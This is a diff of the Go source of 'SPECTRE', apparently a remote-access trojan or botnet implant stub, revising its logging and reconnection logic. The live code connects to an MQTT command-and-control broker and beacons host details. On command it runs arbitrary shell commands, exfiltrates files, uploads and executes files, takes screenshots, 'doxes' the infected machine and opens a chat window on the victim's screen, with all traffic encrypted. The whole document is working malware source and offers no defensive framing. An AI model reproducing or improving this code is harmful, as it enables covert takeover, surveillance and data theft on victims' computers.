@@ -1,5 +1,3 @@
-// SPECTRE_Stub.go
-// SPECTRE: System for Persistent Execution, Control, and Targeted Remote Engagement
 package main
 
 import (
@@ -8,9 +6,9 @@ import (
 	"crypto/cipher"
 	crand "crypto/rand" // Alias crypto/rand to avoid conflict
 	"encoding/base64"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"github.com/eclipse/paho.mqtt.golang"
 	"image/png"
 	"io"
 	"io/ioutil"
@@ -25,72 +23,66 @@ import (
 	"sync"
 	"time"
 
-	"github.com/eclipse/paho.mqtt.golang"
 	"github.com/kbinani/screenshot"
 )
 
 var (
-	brokerURL     = "{BROKER_URL}"     // To be replaced by SPECTRE.py
-	brokerPort    = {BROKER_PORT}      // To be replaced by SPECTRE.py
-	topic         = "{TOPIC}"          // To be replaced by SPECTRE.py
-	botID         = "{BOT_ID}"         // To be replaced by SPECTRE.py
-	apiToken      = "{API_TOKEN}"      // To be replaced by SPECTRE.py
-	encryptionKey = "{ENCRYPTION_KEY}" // To be replaced by SPECTRE.py, default "1234"
+	brokerURL     = "{BROKER_URL}"
+	brokerPort    = {BROKER_PORT}
+	topic         = "{TOPIC}"
+	botID         = "{BOT_ID}"
+	apiToken      = "{API_TOKEN}"
+	encryptionKey = "{ENCRYPTION_KEY}"
 
 	client        mqtt.Client
 	running       bool = true
 	isConnected   bool
+	isListed      bool
 	currentDir    string
 	infectedDate  string
-	messageChan   chan string // Channel to pass messages
-	closeChan     chan bool   // Channel to signal chat closure
-	replyChan     chan string // Channel to pass replies back to MQTT handler
-	logFile       *os.File    // File for logging instead of stdout
+	messageChan   chan string
+	closeChan     chan bool
+	replyChan     chan string
 	httpServer    *http.Server
-	chatActive    bool        // Flag to track if a chat session is active
-	chatPort      int         // Port of the active chat session
-	chatMessages  []string    // Queue of messages for the chat session
-	chatMutex     sync.Mutex  // Mutex to protect chatMessages
+	chatActive    bool
+	chatPort      int
+	chatMessages  []string
+	chatMutex     sync.Mutex
 )
 
 func encryptMessage(message string) string {
 	key := []byte(encryptionKey)
-	// Ensure the key is 16, 24, or 32 bytes long (AES-128, AES-192, AES-256)
 	if len(key) < 16 {
-		key = append(key, make([]byte, 16-len(key))...) // Pad with null bytes
+		key = append(key, make([]byte, 16-len(key))...)
 	} else if len(key) > 16 && len(key) < 24 {
 		key = append(key, make([]byte, 24-len(key))...)
 	} else if len(key) > 24 && len(key) < 32 {
 		key = append(key, make([]byte, 32-len(key))...)
 	} else if len(key) > 32 {
-		key = key[:32] // Truncate to AES-256 length
+		key = key[:32]
 	}
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		fmt.Fprintf(logFile, "Bot %s encryption error: %v\n", botID, err)
+		fmt.Printf("Bot %s encryption error: %v\n", botID, err)
 		return message
 	}
 
 	aesgcm, err := cipher.NewGCM(block)
 	if err != nil {
-		fmt.Fprintf(logFile, "Bot %s encryption error: %v\n", botID, err)
+		fmt.Printf("Bot %s encryption error: %v\n", botID, err)
 		return message
 	}
 
-	nonce := make([]byte, aesgcm.NonceSize()) // 12 bytes by default for GCM
+	nonce := make([]byte, aesgcm.NonceSize())
 	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
-		fmt.Fprintf(logFile, "Bot %s encryption error: %v\n", botID, err)
+		fmt.Printf("Bot %s encryption error: %v\n", botID, err)
 		return message
 	}
 
-	// Encrypt and get ciphertext + tag
 	ciphertext := aesgcm.Seal(nil, nonce, []byte(message), nil)
-	// Extract the tag (last 16 bytes of ciphertext)
 	tag := ciphertext[len(ciphertext)-16:]
-	// Extract the actual ciphertext (without tag)
 	pureCiphertext := ciphertext[:len(ciphertext)-16]
-	// Combine nonce + pure ciphertext + tag
 	encrypted := append(nonce, pureCiphertext...)
 	encrypted = append(encrypted, tag...)
 	return base64.StdEncoding.EncodeToString(encrypted)
@@ -99,55 +91,52 @@ func encryptMessage(message string) string {
 func decryptMessage(encryptedMessage string) string {
 	encryptedData, err := base64.StdEncoding.DecodeString(encryptedMessage)
 	if err != nil {
-		fmt.Fprintf(logFile, "Bot %s decryption error: %v\n", botID, err)
+		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
 		return encryptedMessage
 	}
 
 	key := []byte(encryptionKey)
-	// Ensure the key is 16, 24, or 32 bytes long (AES-128, AES-192, AES-256)
 	if len(key) < 16 {
-		key = append(key, make([]byte, 16-len(key))...) // Pad with null bytes
+		key = append(key, make([]byte, 16-len(key))...)
 	} else if len(key) > 16 && len(key) < 24 {
 		key = append(key, make([]byte, 24-len(key))...)
 	} else if len(key) > 24 && len(key) < 32 {
 		key = append(key, make([]byte, 32-len(key))...)
 	} else if len(key) > 32 {
-		key = key[:32] // Truncate to AES-256 length
+		key = key[:32]
 	}
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		fmt.Fprintf(logFile, "Bot %s decryption error: %v\n", botID, err)
+		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
 		return encryptedMessage
 	}
 
 	aesgcm, err := cipher.NewGCM(block)
 	if err != nil {
-		fmt.Fprintf(logFile, "Bot %s decryption error: %v\n", botID, err)
+		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
 		return encryptedMessage
 	}
 
-	nonceSize := aesgcm.NonceSize() // 12 bytes
-	if len(encryptedData) < nonceSize+16 { // At least nonce + tag (16 bytes)
-		fmt.Fprintf(logFile, "Bot %s decryption error: invalid encrypted data\n", botID)
+	nonceSize := aesgcm.NonceSize()
+	if len(encryptedData) < nonceSize+16 {
+		fmt.Printf("Bot %s decryption error: invalid encrypted data\n", botID)
 		return encryptedMessage
 	}
 
 	nonce := encryptedData[:nonceSize]
 	tag := encryptedData[len(encryptedData)-16:]
 	ciphertext := encryptedData[nonceSize : len(encryptedData)-16]
-	// Combine ciphertext and tag for Go's Open method
 	combinedCiphertext := append(ciphertext, tag...)
 	plaintext, err := aesgcm.Open(nil, nonce, combinedCiphertext, nil)
 	if err != nil {
-		fmt.Fprintf(logFile, "Bot %s decryption error: %v\n", botID, err)
+		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
 		return encryptedMessage
 	}
 
 	return string(plaintext)
 }
 
-// HTML template for the chat interface with polling
 const chatHTML = `
 <!DOCTYPE html>
 <html>
@@ -202,13 +191,8 @@ const chatHTML = `
         const chatArea = document.getElementById('chatArea');
         const messageInput = document.getElementById('messageInput');
         let lastMessageCount = 0;
-
-        // Initial message
         fetchMessages();
-
-        // Poll for new messages every second
         setInterval(fetchMessages, 1000);
-
         function fetchMessages() {
             fetch('/messages')
                 .then(response => response.json())
@@ -221,14 +205,11 @@ const chatHTML = `
                 })
                 .catch(err => console.error('Error fetching messages:', err));
         }
-
-        // Handle Enter key to send reply
         messageInput.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 sendReply();
             }
         });
-
         function sendReply() {
             const reply = messageInput.value.trim();
             if (reply !== "") {
@@ -252,18 +233,9 @@ const chatHTML = `
 `
 
 func init() {
-	// Initialize log file
-	var err error
-	logFile, err = os.OpenFile("spectre.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		// If we can't open the log file, fall back to stderr
-		logFile = os.Stderr
-	}
-
-	// Initialize current directory
 	home, err := os.UserHomeDir()
 	if err != nil {
-		fmt.Fprintf(logFile, "Error getting home directory: %v\n", err)
+		fmt.Printf("Error getting home directory: %v\n", err)
 		currentDir = "."
 	} else {
 		currentDir = home
@@ -285,8 +257,8 @@ type CommandMessage struct {
 	Action  string `json:"action"`
 	Command string `json:"command,omitempty"`
 	Message string `json:"message,omitempty"`
-	File    string `json:"file,omitempty"`    // For download/execute
-	Data    string `json:"data,omitempty"`    // For upload
+	File    string `json:"file,omitempty"`
+	Data    string `json:"data,omitempty"`
 }
 
 type ResponseMessage struct {
@@ -297,14 +269,14 @@ type ResponseMessage struct {
 	Result     string `json:"result,omitempty"`
 	CurrentDir string `json:"current_dir,omitempty"`
 	ZipData    string `json:"zip_data,omitempty"`
-	FileData   string `json:"file_data,omitempty"` // For download/screenshot
+	FileData   string `json:"file_data,omitempty"`
 }
 
 func sendPresence(client mqtt.Client) {
 	hostname, _ := os.Hostname()
 	ip, err := getLocalIP()
 	if err != nil {
-		fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
+		fmt.Printf("Error getting local IP: %v\n", err)
 		return
 	}
 	osInfo := runtime.GOOS
@@ -318,30 +290,40 @@ func sendPresence(client mqtt.Client) {
 	msgBytes, _ := json.Marshal(connectMsg)
 	encryptedMsg := encryptMessage(string(msgBytes))
 	client.Publish(topic, 1, false, encryptedMsg)
-	fmt.Fprintf(logFile, "Bot %s sent presence: %s\n", botID, string(msgBytes))
+	fmt.Printf("Bot %s sent presence: %s\n", botID, string(msgBytes))
 }
 
 func sendPresencePeriodically() {
 	for running {
 		if isConnected {
-			sendPresence(client)
+			if isListed {
+				sendPresence(client)
+				time.Sleep(24 * time.Hour)
+			} else {
+				sendPresence(client)
+				isListed = true // Assume listed after sending presence
+				time.Sleep(24 * time.Hour)
+			}
+		} else {
+			time.Sleep(5 * time.Minute)
 		}
-		time.Sleep(24 * time.Hour)
 	}
 }
 
 func onConnect(client mqtt.Client) {
 	client.Publish(topic, 1, true, nil)
-	fmt.Fprintf(logFile, "Bot %s cleared retained messages on topic %s\n", botID, topic)
+	fmt.Printf("Bot %s cleared retained messages on topic %s\n", botID, topic)
 	client.Subscribe(topic, 1, nil)
-	fmt.Fprintf(logFile, "Bot %s subscribed to topic %s\n", botID, topic)
+	fmt.Printf("Bot %s subscribed to topic %s\n", botID, topic)
 	isConnected = true
 	sendPresence(client)
+	isListed = true
 }
 
 func onDisconnect(client mqtt.Client, err error) {
-	fmt.Fprintf(logFile, "Bot %s disconnected from MQTT broker: %v\n", botID, err)
+	fmt.Printf("Bot %s disconnected from MQTT broker: %v\n", botID, err)
 	isConnected = false
+	isListed = false
 }
 
 func getLocalIP() (string, error) {
@@ -423,7 +405,7 @@ func executeShellCommand(command string) string {
 			return fmt.Sprintf("Error resolving path: %v", err)
 		}
 		currentDir = currentDirnew
-		return "" // Remove "Changed directory to" message
+		return ""
 	} else {
 		var cmd *exec.Cmd
 		if runtime.GOOS == "windows" {
@@ -445,7 +427,7 @@ func executeShellCommand(command string) string {
 func createDoxZip() string {
 	ip, err := getLocalIP()
 	if err != nil {
-		fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
+		fmt.Printf("Error getting local IP: %v\n", err)
 		ip = "unknown"
 	}
 	data := map[string]string{
@@ -454,11 +436,10 @@ func createDoxZip() string {
 		"infected_date": infectedDate,
 	}
 	dataBytes, _ := json.Marshal(data)
-	return hex.EncodeToString(dataBytes)
+	return base64.StdEncoding.EncodeToString(dataBytes)
 }
 
 func takeScreenshot() (string, error) {
-	// Capture the primary display
 	n := screenshot.NumActiveDisplays()
 	if n < 1 {
 		return "", fmt.Errorf("no active displays found")
@@ -469,13 +450,11 @@ func takeScreenshot() (string, error) {
 		return "", fmt.Errorf("error capturing screenshot: %v", err)
 	}
 
-	// Encode the image to PNG format
 	var buf bytes.Buffer
 	if err := png.Encode(&buf, img); err != nil {
 		return "", fmt.Errorf("error encoding screenshot to PNG: %v", err)
 	}
 
-	// Encode the PNG data to base64
 	encodedData := base64.StdEncoding.EncodeToString(buf.Bytes())
 	return encodedData, nil
 }
@@ -485,7 +464,7 @@ func handleMessageInteraction(message string) {
 	if chatActive {
 		chatMessages = append(chatMessages, fmt.Sprintf("Received: %s", message))
 		chatMutex.Unlock()
-		fmt.Fprintf(logFile, "Appended message to existing chat session\n")
+		fmt.Printf("Appended message to existing chat session\n")
 		return
 	}
 
@@ -498,7 +477,7 @@ func handleMessageInteraction(message string) {
 	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("spectre_chat_%s.html", botID))
 	err := ioutil.WriteFile(tempFile, []byte(chatHTML), 0644)
 	if err != nil {
-		fmt.Fprintf(logFile, "Error writing chat HTML to temp file: %v\n", err)
+		fmt.Printf("Error writing chat HTML to temp file: %v\n", err)
 		chatActive = false
 		return
 	}
@@ -541,7 +520,7 @@ func handleMessageInteraction(message string) {
 
 	go func() {
 		if err := httpServer.ListenAndServe(); err != http.ErrServerClosed {
-			fmt.Fprintf(logFile, "HTTP server error: %v\n", err)
+			fmt.Printf("HTTP server error: %v\n", err)
 		}
 	}()
 
@@ -555,17 +534,17 @@ func handleMessageInteraction(message string) {
 		cmd = exec.Command("xdg-open", url)
 	}
 	if err := cmd.Start(); err != nil {
-		fmt.Fprintf(logFile, "Error opening browser: %v\n", err)
+		fmt.Printf("Error opening browser: %v\n", err)
 		chatActive = false
 		return
 	}
-	fmt.Fprintf(logFile, "Opened browser for chat at %s\n", url)
+	fmt.Printf("Opened browser for chat at %s\n", url)
 
 	<-closeChan
-	fmt.Fprintf(logFile, "Chat session closed due to close_message command\n")
+	fmt.Printf("Chat session closed due to close_message command\n")
 
 	if err := httpServer.Close(); err != nil {
-		fmt.Fprintf(logFile, "Error closing HTTP server: %v\n", err)
+		fmt.Printf("Error closing HTTP server: %v\n", err)
 	}
 	chatMutex.Lock()
 	chatActive = false
@@ -579,39 +558,38 @@ func onMessage(client mqtt.Client, msg mqtt.Message) {
 	var data CommandMessage
 	encryptedMessage := string(msg.Payload())
 	if encryptedMessage == "" {
-		fmt.Fprintf(logFile, "Bot %s received empty message, ignoring\n", botID)
+		fmt.Printf("Bot %s received empty message, ignoring\n", botID)
 		return
 	}
 
-	// Decrypt the message
 	message := decryptMessage(encryptedMessage)
 	if err := json.Unmarshal([]byte(message), &data); err != nil {
-		fmt.Fprintf(logFile, "Bot %s error decoding message: %v\n", botID, err)
+		fmt.Printf("Bot %s error decoding message: %v\n", botID, err)
 		return
 	}
-	fmt.Fprintf(logFile, "Bot %s received message: %s\n", botID, message)
+	fmt.Printf("Bot %s received message: %s\n", botID, message)
 
 	if data.Type == "command" {
 		target := data.Target
-		fmt.Fprintf(logFile, "Bot %s target: %s\n", botID, target)
+		fmt.Printf("Bot %s target: %s\n", botID, target)
 		if target == "all" {
-			fmt.Fprintf(logFile, "Bot %s processing command for 'all'\n", botID)
+			fmt.Printf("Bot %s processing command for 'all'\n", botID)
 			action := data.Action
-			fmt.Fprintf(logFile, "Bot %s action: %s\n", botID, action)
+			fmt.Printf("Bot %s action: %s\n", botID, action)
 			processAction(action, data)
 		} else {
 			lastColonIndex := strings.LastIndex(target, ":")
 			if lastColonIndex == -1 {
-				fmt.Fprintf(logFile, "Bot %s invalid target format: %s\n", botID, target)
+				fmt.Printf("Bot %s invalid target format: %s\n", botID, target)
 				return
 			}
 			targetIP := target[:lastColonIndex]
 			targetID := target[lastColonIndex+1:]
-			fmt.Fprintf(logFile, "Bot %s target parts: [IP: %s, ID: %s]\n", botID, targetIP, targetID)
+			fmt.Printf("Bot %s target parts: [IP: %s, ID: %s]\n", botID, targetIP, targetID)
 
 			ip, err := getLocalIP()
 			if err != nil {
-				fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
+				fmt.Printf("Error getting local IP: %v\n", err)
 				return
 			}
 			normalizedTargetIP := targetIP
@@ -622,14 +600,14 @@ func onMessage(client mqtt.Client, msg mqtt.Message) {
 			if ip == "::1" || ip == "127.0.0.1" {
 				normalizedLocalIP = "localhost"
 			}
-			fmt.Fprintf(logFile, "Bot %s comparing: ip=%s, target_ip=%s, bot_id=%s, target_id=%s\n", botID, normalizedLocalIP, normalizedTargetIP, botID, targetID)
+			fmt.Printf("Bot %s comparing: ip=%s, target_ip=%s, bot_id=%s, target_id=%s\n", botID, normalizedLocalIP, normalizedTargetIP, botID, targetID)
 			if normalizedTargetIP == normalizedLocalIP && targetID == botID {
-				fmt.Fprintf(logFile, "Bot %s target matches\n", botID)
+				fmt.Printf("Bot %s target matches\n", botID)
 				action := data.Action
-				fmt.Fprintf(logFile, "Bot %s action: %s\n", botID, action)
+				fmt.Printf("Bot %s action: %s\n", botID, action)
 				processAction(action, data)
 			} else {
-				fmt.Fprintf(logFile, "Bot %s target does not match: ip mismatch (%s != %s) or id mismatch (%s != %s)\n", botID, normalizedLocalIP, normalizedTargetIP, botID, targetID)
+				fmt.Printf("Bot %s target does not match: ip mismatch (%s != %s) or id mismatch (%s != %s)\n", botID, normalizedLocalIP, normalizedTargetIP, botID, targetID)
 			}
 		}
 	}
@@ -638,13 +616,15 @@ func onMessage(client mqtt.Client, msg mqtt.Message) {
 func processAction(action string, data CommandMessage) {
 	ip, err := getLocalIP()
 	if err != nil {
-		fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
+		fmt.Printf("Error getting local IP: %v\n", err)
 		return
 	}
 	switch action {
 	case "ping":
-		fmt.Fprintf(logFile, "Bot %s processing ping command\n", botID)
-		sendPresence(client)
+		fmt.Printf("Bot %s processing ping command\n", botID)
+		if isListed {
+			sendPresence(client)
+		}
 	case "shell":
 		command := data.Command
 		result := executeShellCommand(command)
@@ -658,22 +638,22 @@ func processAction(action string, data CommandMessage) {
 		msgBytes, _ := json.Marshal(response)
 		encryptedMsg := encryptMessage(string(msgBytes))
 		client.Publish(topic, 1, false, encryptedMsg)
-		fmt.Fprintf(logFile, "Bot %s sent shell response: %s\n", botID, string(msgBytes))
+		fmt.Printf("Bot %s sent shell response: %s\n", botID, string(msgBytes))
 	case "download":
 		fileName := data.File
 		filePath := filepath.Join(currentDir, fileName)
 		fileInfo, err := os.Stat(filePath)
 		if err != nil {
-			fmt.Fprintf(logFile, "Bot %s error accessing file %s: %v\n", botID, filePath, err)
+			fmt.Printf("Bot %s error accessing file %s: %v\n", botID, filePath, err)
 			return
 		}
 		if fileInfo.IsDir() {
-			fmt.Fprintf(logFile, "Bot %s cannot download directory %s\n", botID, filePath)
+			fmt.Printf("Bot %s cannot download directory %s\n", botID, filePath)
 			return
 		}
 		fileData, err := ioutil.ReadFile(filePath)
 		if err != nil {
-			fmt.Fprintf(logFile, "Bot %s error reading file %s: %v\n", botID, filePath, err)
+			fmt.Printf("Bot %s error reading file %s: %v\n", botID, filePath, err)
 			return
 		}
 		encodedData := base64.StdEncoding.EncodeToString(fileData)
@@ -687,18 +667,18 @@ func processAction(action string, data CommandMessage) {
 		msgBytes, _ := json.Marshal(response)
 		encryptedMsg := encryptMessage(string(msgBytes))
 		client.Publish(topic, 1, false, encryptedMsg)
-		fmt.Fprintf(logFile, "Bot %s sent download response for file %s\n", botID, fileName)
+		fmt.Printf("Bot %s sent download response for file %s\n", botID, fileName)
 	case "upload":
 		fileName := data.File
 		filePath := filepath.Join(currentDir, fileName)
 		fileData, err := base64.StdEncoding.DecodeString(data.Data)
 		if err != nil {
-			fmt.Fprintf(logFile, "Bot %s error decoding file data for %s: %v\n", botID, fileName, err)
+			fmt.Printf("Bot %s error decoding file data for %s: %v\n", botID, fileName, err)
 			return
 		}
 		err = ioutil.WriteFile(filePath, fileData, 0644)
 		if err != nil {
-			fmt.Fprintf(logFile, "Bot %s error writing file %s: %v\n", botID, filePath, err)
+			fmt.Printf("Bot %s error writing file %s: %v\n", botID, filePath, err)
 			return
 		}
 		response := ResponseMessage{
@@ -710,17 +690,17 @@ func processAction(action string, data CommandMessage) {
 		msgBytes, _ := json.Marshal(response)
 		encryptedMsg := encryptMessage(string(msgBytes))
 		client.Publish(topic, 1, false, encryptedMsg)
-		fmt.Fprintf(logFile, "Bot %s sent upload response for file %s\n", botID, fileName)
+		fmt.Printf("Bot %s sent upload response for file %s\n", botID, fileName)
 	case "execute":
 		fileName := data.File
 		filePath := filepath.Join(currentDir, fileName)
 		fileInfo, err := os.Stat(filePath)
 		if err != nil {
-			fmt.Fprintf(logFile, "Bot %s error accessing file %s: %v\n", botID, filePath, err)
+			fmt.Printf("Bot %s error accessing file %s: %v\n", botID, filePath, err)
 			return
 		}
 		if fileInfo.IsDir() {
-			fmt.Fprintf(logFile, "Bot %s cannot execute directory %s\n", botID, filePath)
+			fmt.Printf("Bot %s cannot execute directory %s\n", botID, filePath)
 			return
 		}
 		var cmd *exec.Cmd
@@ -732,7 +712,7 @@ func processAction(action string, data CommandMessage) {
 		cmd.Dir = currentDir
 		err = cmd.Start()
 		if err != nil {
-			fmt.Fprintf(logFile, "Bot %s error executing file %s: %v\n", botID, filePath, err)
+			fmt.Printf("Bot %s error executing file %s: %v\n", botID, filePath, err)
 			return
 		}
 		response := ResponseMessage{
@@ -744,11 +724,11 @@ func processAction(action string, data CommandMessage) {
 		msgBytes, _ := json.Marshal(response)
 		encryptedMsg := encryptMessage(string(msgBytes))
 		client.Publish(topic, 1, false, encryptedMsg)
-		fmt.Fprintf(logFile, "Bot %s sent execute response for file %s\n", botID, fileName)
+		fmt.Printf("Bot %s sent execute response for file %s\n", botID, fileName)
 	case "screenshot":
 		encodedData, err := takeScreenshot()
 		if err != nil {
-			fmt.Fprintf(logFile, "Bot %s error taking screenshot: %v\n", botID, err)
+			fmt.Printf("Bot %s error taking screenshot: %v\n", botID, err)
 			return
 		}
 		response := ResponseMessage{
@@ -761,9 +741,9 @@ func processAction(action string, data CommandMessage) {
 		msgBytes, _ := json.Marshal(response)
 		encryptedMsg := encryptMessage(string(msgBytes))
 		client.Publish(topic, 1, false, encryptedMsg)
-		fmt.Fprintf(logFile, "Bot %s sent screenshot response\n", botID)
+		fmt.Printf("Bot %s sent screenshot response\n", botID)
 	case "dox":
-		fmt.Fprintf(logFile, "Bot %s processing dox command\n", botID)
+		fmt.Printf("Bot %s processing dox command\n", botID)
 		zipData := createDoxZip()
 		response := ResponseMessage{
 			Type:    "dox_response",
@@ -774,24 +754,50 @@ func processAction(action string, data CommandMessage) {
 		msgBytes, _ := json.Marshal(response)
 		encryptedMsg := encryptMessage(string(msgBytes))
 		client.Publish(topic, 1, false, encryptedMsg)
-		fmt.Fprintf(logFile, "Bot %s sent dox response\n", botID)
+		fmt.Printf("Bot %s sent dox response\n", botID)
 	case "message":
 		message := data.Message
 		go handleMessageInteraction(message)
 	case "close_message":
-		fmt.Fprintf(logFile, "Bot %s received close_message command\n", botID)
+		fmt.Printf("Bot %s received close_message command\n", botID)
 		closeChan <- true
 	case "disconnect":
-		fmt.Fprintf(logFile, "Bot %s received disconnect command\n", botID)
+		fmt.Printf("Bot %s received disconnect command\n", botID)
 		client.Disconnect(250)
 		running = false
-		logFile.Close()
 		os.Exit(0)
 	}
 }
 
+func connectWithBackoff() {
+	backoffDurations := []time.Duration{
+		1 * time.Minute,
+		2 * time.Minute,
+		5 * time.Minute,
+	}
+	attempt := 0
+
+	for running && !isConnected {
+		if attempt >= len(backoffDurations) {
+			attempt = len(backoffDurations) - 1
+		}
+		duration := backoffDurations[attempt]
+
+		fmt.Printf("Bot %s attempting to connect to MQTT broker (attempt %d, waiting %v)\n", botID, attempt+1, duration)
+		if token := client.Connect(); token.Wait() && token.Error() != nil {
+			fmt.Printf("Bot %s failed to connect to MQTT broker: %v\n", botID, token.Error())
+			time.Sleep(duration)
+			attempt++
+			continue
+		}
+		fmt.Printf("Bot %s successfully connected to MQTT broker\n", botID)
+		client.Subscribe(topic, 1, onMessage)
+		attempt = 0
+	}
+}
+
 func main() {
-	fmt.Fprintf(logFile, "Bot %s starting up, waiting for messages...\n", botID)
+	fmt.Printf("Bot %s starting up, waiting for messages...\n", botID)
 
 	rand.Seed(time.Now().UnixNano())
 
@@ -813,20 +819,14 @@ func main() {
 	go sendPresencePeriodically()
 
 	for running {
-		if token := client.Connect(); token.Wait() && token.Error() != nil {
-			fmt.Fprintf(logFile, "Bot %s failed to connect to MQTT broker: %v\n", botID, token.Error())
-			time.Sleep(5 * time.Second)
-			continue
-		}
-		fmt.Fprintf(logFile, "Bot %s successfully connected to MQTT broker\n", botID)
-		client.Subscribe(topic, 1, onMessage)
+		connectWithBackoff()
 		for running && isConnected {
 			select {
 			case reply := <-replyChan:
 				if reply != "" {
 					ip, err := getLocalIP()
 					if err != nil {
-						fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
+						fmt.Printf("Error getting local IP: %v\n", err)
 						continue
 					}
 					response := ResponseMessage{
@@ -838,7 +838,7 @@ func main() {
 					msgBytes, _ := json.Marshal(response)
 					encryptedMsg := encryptMessage(string(msgBytes))
 					client.Publish(topic, 1, false, encryptedMsg)
-					fmt.Fprintf(logFile, "Bot %s sent message reply: %s\n", botID, string(msgBytes))
+					fmt.Printf("Bot %s sent message reply: %s\n", botID, string(msgBytes))
 				}
 			default:
 				time.Sleep(100 * time.Millisecond)
@@ -847,11 +847,9 @@ func main() {
 		if !running {
 			break
 		}
-		time.Sleep(5 * time.Second)
 	}
 
 	if running {
 		client.Disconnect(250)
 	}
-	logFile.Close()
 }
